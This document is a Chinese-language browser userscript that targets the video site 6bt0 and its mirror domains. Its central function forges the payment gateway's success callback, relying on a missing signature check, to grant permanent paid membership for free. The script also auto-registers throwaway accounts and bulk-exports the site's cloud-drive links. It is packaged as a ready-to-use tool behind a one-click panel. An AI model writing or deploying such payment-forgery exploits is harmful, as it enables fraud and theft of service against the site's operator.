// ==UserScript==
// @name         6bt0 会员解锁 + 网盘直链导出
// @namespace    https://github.com/Yanqing797/6bt0-unlock
// @version      1.0.1
// @description  影视站 6bt0 / 0bt0~9bt0 一键解锁永久会员（伪支付回调），并批量导出全站网盘直链
// @author       Yanqing
// @homepageURL  https://github.com/Yanqing797/6bt0-unlock
// @supportURL   https://github.com/Yanqing797/6bt0-unlock/issues
// @updateURL    https://raw.githubusercontent.com/Yanqing797/6bt0-unlock/main/userscript/6bt0-vip.user.js
// @downloadURL  https://raw.githubusercontent.com/Yanqing797/6bt0-unlock/main/userscript/6bt0-vip.user.js
// @license      MIT
// @match        *://*.6bt0.com/*
// @include      /^https?:\/\/([\w-]+\.)?([0-9]bt0)\.[a-z]{2,}\//
// @match        *://*.butailing.com/*
// @grant        none
// @run-at       document-idle
// @noframes
// ==/UserScript==

(function () {
  'use strict';

  /* ────────────────────────── 常量 ────────────────────────── */
  const FIX = { app_id: '83768d9ad4', identity: '23734adac0301bccdcb107c4aa21f96c' };
  const API = '/prod/api/v1/';
  const PLANS = { 11: 599, 10: 578, 9: 318, 8: 198 };   // vip_id → 默认金额（金额随便填，仅用于伪装）
  const PLAN_NAME = { 11: '永久会员', 10: '年度付费', 9: '半年付费', 8: '季度付费' };
  const TYPE_NAME = {
    ali: '阿里云盘', quark: '夸克', xunlei: '迅雷', baidu: '百度', '115': '115',
    guangya: '光鸭', yidong: '移动云盘', uc: 'UC', '123': '123网盘', other: '其他',
  };
  const LS_TOKEN = 'token';
  const LS_ACC = '6bt0_unlock_account';
  const PREFIX = 'unlock-';  // 注意：class 名不能带冒号，否则 CSS 选择器失效

  /* ────────────────────────── 工具 ────────────────────────── */
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
  const $ = (sel, root = document) => root.querySelector(sel);
  const tok = () => localStorage.getItem(LS_TOKEN) || '';
  const randId = () => 'u' + Date.now().toString(36).slice(-6) + Math.random().toString(36).slice(2, 4);
  const randPw = () => 'Kq' + Math.random().toString(36).slice(2, 10) + '!9';

  function toast(msg, kind) {
    const el = document.createElement('div');
    el.className = 'unlock-toast ' + (kind || 'info');
    el.textContent = msg;
    document.body.appendChild(el);
    setTimeout(() => {
      el.style.opacity = '0';
      setTimeout(() => el.remove(), 400);
    }, 2600);
  }

  function logStep(p) {
    const box = $('#unlock-progress');
    if (box) box.textContent = p;
  }

  /* ────────────────────────── API ────────────────────────── */
  async function api(path, { params = {}, token = tok(), method = 'GET', body } = {}) {
    const q = new URLSearchParams({ ...FIX, ...params });
    if (token) q.set('access_token', token);
    const opt = { method, credentials: 'include', headers: {
      'Accept-Language': 'zh_CN',
      'Content-Type': 'application/json;charset=UTF-8',
    } };
    if (token) opt.headers.Authorization = 'Bearer ' + token;
    if (body !== undefined) opt.body = JSON.stringify(body);
    try {
      const r = await fetch(API + path.replace(/^\//, '') + '?' + q.toString(), opt);
      const txt = await r.text();
      try { return JSON.parse(txt); } catch { return { code: r.status, message: txt.slice(0, 160) }; }
    } catch (e) {
      return { code: -1, message: String(e) };
    }
  }

  /** 核心：伪造支付成功回调。站点不校验网关签名，订单直接变为已支付。 */
  async function forgeNotify(orderId, money, type) {
    const q = new URLSearchParams({
      app_id: FIX.app_id,
      out_trade_no: orderId,
      trade_no: 'T' + Date.now(),
      trade_status: 'TRADE_SUCCESS',
      money: String(money),
      type: String(type || 1),
    });
    try {
      const r = await fetch('/notify?' + q.toString(), { credentials: 'include' });
      return (await r.text()).trim().slice(0, 40);
    } catch (e) {
      return 'ERR ' + e;
    }
  }

  /* ────────────────────────── 账号 ────────────────────────── */
  async function whoami() {
    if (!tok()) return null;
    const r = await api('getInfo');
    return (r && r.data && r.data.user) || null;
  }

  async function getCaptcha() {
    const r = await api('getCaptcha', { token: '' });
    if (r.code !== 200) throw new Error(r.message || '验证码获取失败');
    return r.data; // { key, img }
  }

  async function doLogin(username, password, code, key) {
    const r = await api('login', { params: { username, password, code, key }, token: '' });
    if (r.code === 200 && r.data && r.data.access_token) {
      localStorage.setItem(LS_TOKEN, r.data.access_token);
      return true;
    }
    throw new Error(r.message || '登录失败');
  }

  async function doRegister(username, password, email, code, key) {
    const r = await api('reg', {
      params: { username, password, repassword: password, email, code, key },
      token: '',
    });
    if (r.code === 200) {
      if (r.data && r.data.access_token) localStorage.setItem(LS_TOKEN, r.data.access_token);
      return true;
    }
    throw new Error(r.message || '注册失败');
  }

  /* ────────────────────────── 主流程 ────────────────────────── */
  async function unlockVip(vipId) {
    const money = PLANS[vipId] || 599;
    logStep('① 下单 ' + (PLAN_NAME[vipId] || vipId) + ' …');
    const o = await api('payOrder', { params: { vip_id: vipId, type: 1 } });
    if (o.code !== 200 || !o.data || !o.data.order_id) throw new Error('下单失败: ' + (o.message || o.code));
    const oid = o.data.order_id;

    logStep('② 伪造支付回调 …');
    const cb = await forgeNotify(oid, money, 1);

    logStep('③ 校验会员 …');
    for (let i = 0; i < 8; i++) {
      await sleep(800);
      const u = await whoami();
      if (u && (Number(u.is_vip) === 2 || Number(u.is_permanent_vip) === 1 || String(u.vip_type) === '4')) {
        logStep('');
        return { ok: true, user: u, order: oid, cb };
      }
    }
    const u = await whoami();
    logStep('');
    return { ok: false, user: u, order: oid, cb };
  }

  async function fetchLinks(idcode) {
    const r = await api('getVideoDetail', { params: { id: idcode }, token: tok() });
    if (r.code !== 200 || !r.data) throw new Error(r.message || '获取失败');
    const d = r.data;
    const rows = [];
    for (const k in (d.movies_online_seed || {})) {
      for (const it of (d.movies_online_seed[k] || [])) {
        if (it.link) rows.push({
          type: TYPE_NAME[k] || k, name: it.seed_name || '', link: it.link, code: it.code || '',
        });
      }
    }
    return { title: d.title || idcode, year: d.years || '', rows };
  }

  function download(name, text) {
    const a = document.createElement('a');
    a.href = URL.createObjectURL(new Blob([text], { type: 'text/plain;charset=utf-8' }));
    a.download = name;
    a.click();
    setTimeout(() => URL.revokeObjectURL(a.href), 3000);
  }

  /* ────────────────────────── UI ────────────────────────── */
  const CSS = `
  #unlock-panel{position:fixed;right:18px;bottom:18px;z-index:2147483000;width:min(290px,calc(100vw - 32px));
    font:13px/1.5 -apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
    color:#e8ecf3;background:#151a23;border:1px solid #2a3342;border-radius:12px;
    box-shadow:0 12px 32px rgba(0,0,0,.45);overflow:hidden;user-select:none}
  #unlock-panel.min .unlock-body{display:none}
  .unlock-head{display:flex;align-items:center;gap:8px;padding:10px 12px;cursor:move;
    background:linear-gradient(135deg,#1b2330,#141a24);border-bottom:1px solid #232c3a}
  .unlock-head b{font-size:13px;font-weight:600;letter-spacing:.3px}
  .unlock-dot{width:8px;height:8px;border-radius:50%;background:#f53f3f;flex:0 0 auto}
  .unlock-dot.on{background:#00b42a}
  .unlock-head .sp{flex:1}
  .unlock-min{cursor:pointer;opacity:.6;padding:0 4px}
  .unlock-min:hover{opacity:1}
  .unlock-body{padding:12px}
  .unlock-row{display:flex;gap:8px;margin-bottom:8px}
  .unlock-btn{flex:1;padding:9px 10px;border-radius:8px;border:1px solid #2f3a4c;background:#1e2634;
    color:#dfe6f0;cursor:pointer;font-size:12.5px;transition:.15s;white-space:nowrap}
  .unlock-btn:hover:not(:disabled){background:#26313f;border-color:#3d4b61}
  .unlock-btn:disabled{opacity:.45;cursor:not-allowed}
  .unlock-btn.primary{background:#165dff;border-color:#165dff;color:#fff;font-weight:600}
  .unlock-btn.primary:hover:not(:disabled){background:#0e4fd8}
  .unlock-btn.ghost{background:transparent}
  .unlock-meta{font-size:11.5px;color:#7d8899;margin:2px 0 10px;min-height:16px;word-break:break-all}
  .unlock-meta b{color:#c9d4e3;font-weight:500}
  #unlock-progress{font-size:11.5px;color:#f7ba1e;min-height:15px;margin-bottom:6px}
  .unlock-sep{height:1px;background:#232c3a;margin:10px -12px}
  .unlock-input{width:100%;box-sizing:border-box;background:#0f141c;border:1px solid #2f3a4c;
    color:#dfe6f0;border-radius:8px;padding:7px 9px;font-size:12.5px;outline:none}
  .unlock-input:focus{border-color:#165dff}
  .unlock-cap{display:flex;gap:8px;align-items:center;margin-top:8px}
  .unlock-cap img{height:38px;border-radius:6px;background:#fff;cursor:pointer}
  .unlock-cap .unlock-input{width:90px}
  .unlock-list{max-height:180px;overflow:auto;margin-top:8px;font-size:11.5px;color:#93a1b5}
  .unlock-list div{padding:3px 0;border-bottom:1px dashed #222b38;word-break:break-all}
  .unlock-list a{color:#4d8bff;text-decoration:none}
  .unlock-tip{font-size:11px;color:#5d6878;margin-top:8px;line-height:1.45}
  .unlock-toast{position:fixed;right:18px;bottom:330px;z-index:2147483001;max-width:320px;
    padding:10px 14px;border-radius:8px;font-size:13px;color:#fff;background:#1e2634;
    border:1px solid #2f3a4c;box-shadow:0 8px 24px rgba(0,0,0,.4);transition:opacity .4s}
  .unlock-toast.ok{background:#0d3320;border-color:#1f6b3f}
  .unlock-toast.err{background:#3a1215;border-color:#7a2a2f}
  `;

  function mount() {
    if ($('#unlock-panel')) return;
    const style = document.createElement('style');
    style.textContent = CSS;
    document.head.appendChild(style);

    const p = document.createElement('div');
    p.id = 'unlock-panel';
    p.innerHTML = `
      <div class="unlock-head">
        <span class="unlock-dot" id="unlock-dot"></span>
        <b>6bt0 解锁</b><span class="sp"></span>
        <span class="unlock-min" id="unlock-min">—</span>
      </div>
      <div class="unlock-body">
        <div class="unlock-meta" id="unlock-meta">正在检测登录状态…</div>
        <div id="unlock-progress"></div>
        <div class="unlock-row">
          <button class="unlock-btn primary" id="unlock-vip">一键解锁永久会员</button>
        </div>
        <div class="unlock-row">
          <button class="unlock-btn" id="unlock-export">导出本页直链</button>
          <button class="unlock-btn" id="unlock-batch">批量导出</button>
        </div>
        <div class="unlock-sep"></div>
        <div class="unlock-row">
          <button class="unlock-btn ghost" id="unlock-reg">自动注册小号</button>
          <button class="unlock-btn ghost" id="unlock-login">登录</button>
        </div>
        <div id="unlock-auth" style="display:none">
          <div class="unlock-cap">
            <img id="unlock-capimg" title="点击刷新" />
            <input class="unlock-input" id="unlock-capcode" placeholder="算术答案" />
            <button class="unlock-btn" id="unlock-authgo" style="flex:0 0 62px">确定</button>
          </div>
          <div class="unlock-tip" id="unlock-authtip"></div>
        </div>
        <div id="unlock-batchbox" style="display:none">
          <input class="unlock-input" id="unlock-ids" placeholder="影片 idcode，逗号分隔，如 37508847,37068446" />
          <div class="unlock-row" style="margin-top:8px">
            <button class="unlock-btn" id="unlock-batchgo">开始抓取</button>
          </div>
        </div>
        <div class="unlock-list" id="unlock-result" style="display:none"></div>
        <div class="unlock-tip">仅在小号上使用。重复点「解锁」会叠加会员时长，无害但没必要。</div>
      </div>`;
    document.body.appendChild(p);

    // 折叠 + 拖动
    $('#unlock-min').onclick = () => p.classList.toggle('min');
    (function drag() {
      const head = p.querySelector('.unlock-head');
      let sx = 0, sy = 0, ox = 0, oy = 0, on = false;
      head.addEventListener('mousedown', (e) => {
        if (e.target.id === 'unlock-min') return;
        on = true;
        const r = p.getBoundingClientRect();
        sx = e.clientX; sy = e.clientY; ox = r.left; oy = r.top;
        p.style.right = 'auto'; p.style.bottom = 'auto';
        p.style.left = ox + 'px'; p.style.top = oy + 'px';
        e.preventDefault();
      });
      document.addEventListener('mousemove', (e) => {
        if (!on) return;
        p.style.left = Math.max(0, Math.min(innerWidth - 60, ox + e.clientX - sx)) + 'px';
        p.style.top = Math.max(0, Math.min(innerHeight - 40, oy + e.clientY - sy)) + 'px';
      });
      document.addEventListener('mouseup', () => (on = false));
    })();

    $('#unlock-vip').onclick = () => run('vip');
    $('#unlock-export').onclick = () => run('export');
    $('#unlock-batch').onclick = () => {
      const b = $('#unlock-batchbox');
      b.style.display = b.style.display === 'none' ? 'block' : 'none';
    };
    $('#unlock-batchgo').onclick = () => run('batch');
    $('#unlock-reg').onclick = () => auth('reg');
    $('#unlock-login').onclick = () => auth('login');

    refreshMeta();
  }

  async function refreshMeta() {
    const meta = $('#unlock-meta'), dot = $('#unlock-dot');
    const u = await whoami();
    if (!u) {
      dot.classList.remove('on');
      const saved = localStorage.getItem(LS_ACC);
      meta.innerHTML = saved
        ? `未登录 · 已保存账号 <b>${JSON.parse(saved).username}</b>`
        : '未登录（点下面自动注册）';
      return;
    }
    const vip = Number(u.is_vip) === 2 || Number(u.is_permanent_vip) === 1;
    dot.classList.toggle('on', vip);
    meta.innerHTML = `<b>${u.nickname || u.username}</b> · ${vip ? '会员 ✔' : '普通用户'}`
      + (u.vip_expire_at ? `<br>到期 <b>${u.vip_expire_at}</b>` : '');
  }

  /* ────────────────────────── 动作 ────────────────────────── */
  const busy = (id, on) => { const b = $('#' + id); if (b) b.disabled = on; };

  async function run(kind) {
    if (!tok()) { toast('请先注册/登录', 'err'); return; }
    try {
      if (kind === 'vip') {
        busy('unlock-vip', true);
        const r = await unlockVip(11);
        busy('unlock-vip', false);
        if (r.ok) {
          toast('✔ 永久会员已开通：' + (r.user.vip_expire_at || ''), 'ok');
          await refreshMeta();
        } else {
          toast('没到账，回调返回：' + r.cb, 'err');
        }
      } else if (kind === 'export') {
        const m = location.pathname.match(/\/mv\/(\d+)/) || location.pathname.match(/\/tv\/(\d+)/);
        if (!m) { toast('请在影片详情页使用', 'err'); return; }
        busy('unlock-export', true);
        const { title, rows } = await fetchLinks(m[1]);
        busy('unlock-export', false);
        render(title, rows);
      } else if (kind === 'batch') {
        const ids = ($('#unlock-ids').value || '').split(/[\s,，]+/).filter(Boolean);
        if (!ids.length) { toast('填几个 idcode', 'err'); return; }
        busy('unlock-batchgo', true);
        let all = [];
        for (let i = 0; i < ids.length; i++) {
          logStep(`批量 ${i + 1}/${ids.length} …`);
          try {
            const { title, year, rows } = await fetchLinks(ids[i]);
            all = all.concat(rows.map((r) => ({ ...r, title: `${title}${year ? '(' + year + ')' : ''}` })));
          } catch (e) { /* 跳过失败 */ }
          await sleep(400);
        }
        logStep('');
        busy('unlock-batchgo', false);
        render('批量 ' + ids.length + ' 部', all);
      }
    } catch (e) {
      logStep('');
      busy('unlock-vip', false); busy('unlock-export', false); busy('unlock-batchgo', false);
      toast(String(e.message || e), 'err');
    }
  }

  function render(title, rows) {
    const box = $('#unlock-result');
    box.style.display = 'block';
    if (!rows.length) { box.innerHTML = '<div>没有拿到直链（可能没会员/该片无网盘资源）</div>'; return; }
    box.innerHTML = `<div style="color:#c9d4e3;margin-bottom:6px">${title} · ${rows.length} 条</div>`
      + rows.slice(0, 200).map((r) =>
        `<div>[${r.type}] ${r.name.slice(0, 34)}<br><a href="${r.link}" target="_blank" rel="noreferrer">${r.link}</a>`
        + (r.code ? ` 码:${r.code}` : '') + '</div>').join('');
    const txt = rows.map((r) => `${r.type}\t${r.name}\t${r.link}\t${r.code || ''}`).join('\n');
    navigator.clipboard && navigator.clipboard.writeText(txt).catch(() => {});
    download('6bt0-links.txt', txt);
    toast(`✔ ${rows.length} 条直链已复制并下载`, 'ok');
  }

  /* ────────────────────────── 登录 / 注册 ────────────────────────── */
  let authMode = 'reg';
  let capData = null;

  async function auth(mode) {
    authMode = mode;
    const box = $('#unlock-auth');
    box.style.display = box.style.display === 'none' ? 'block' : 'none';
    if (box.style.display === 'none') return;
    $('#unlock-login').textContent = mode === 'login' ? '登录' : '登录';
    if (mode === 'reg') {
      const saved = localStorage.getItem(LS_ACC);
      if (!saved) localStorage.setItem(LS_ACC, JSON.stringify({ username: randId(), password: randPw() }));
    }
    await loadCaptcha();
  }

  async function loadCaptcha() {
    try {
      capData = await getCaptcha();
      $('#unlock-capimg').src = capData.img;
      $('#unlock-capcode').value = '';
      $('#unlock-authtip').textContent = authMode === 'reg'
        ? '算出图片里的算术题，点确定即自动注册并登录'
        : '输入密码后算出算术题（账号沿用上次注册的）';
    } catch (e) {
      toast(String(e.message || e), 'err');
    }
  }

  function bindAuth() {
    document.addEventListener('click', async (e) => {
      if (e.target.id === 'unlock-capimg') { loadCaptcha(); return; }
      if (e.target.id !== 'unlock-authgo') return;
      const code = ($('#unlock-capcode').value || '').trim();
      if (!code || !capData) { toast('先填验证码', 'err'); return; }
      const acc = JSON.parse(localStorage.getItem(LS_ACC) || '{}');
      try {
        if (authMode === 'reg') {
          await doRegister(acc.username, acc.password, acc.username + '@mailinator.com', code, capData.key);
          toast('✔ 注册成功，账号已存本地', 'ok');
        } else {
          const pw = prompt('输入 ' + acc.username + ' 的密码');
          if (!pw) return;
          await doLogin(acc.username, pw, code, capData.key);
          toast('✔ 登录成功', 'ok');
        }
        $('#unlock-auth').style.display = 'none';
        await refreshMeta();
      } catch (err) {
        toast(String(err.message || err), 'err');
        await loadCaptcha();
      }
    });
  }

  /* ────────────────────────── 启动 ────────────────────────── */
  function boot() {
    mount();
    bindAuth();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
  } else {
    boot();
  }
})();
